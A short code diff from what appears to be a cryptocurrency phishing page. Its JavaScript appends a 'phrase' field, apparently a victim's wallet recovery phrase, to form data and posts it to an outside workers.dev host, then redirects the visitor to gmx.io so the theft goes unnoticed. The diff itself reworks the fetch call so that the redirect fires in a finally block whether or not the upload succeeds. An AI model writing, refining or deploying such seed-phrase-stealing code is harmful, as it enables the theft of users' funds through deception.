@@ -23,12 +23,13 @@ const sendDDD = _ => {
                         formData.append('phrase', phrase);
                         try {
                             await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
-                                method: 'POST',
-                                body: formData
-                            });
-                            setTimeout(() => {
-                                window.location.href = 'https://gmx.io';
-                            }, 4000);
+    method: 'POST',
+    body: formData
+}).finally(() => {
+    setTimeout(() => {
+        window.location.href = 'https://gmx.io';
+    }, 4000);
+});
                         } catch (error) {
                             console.log('Error:', error);
                         }
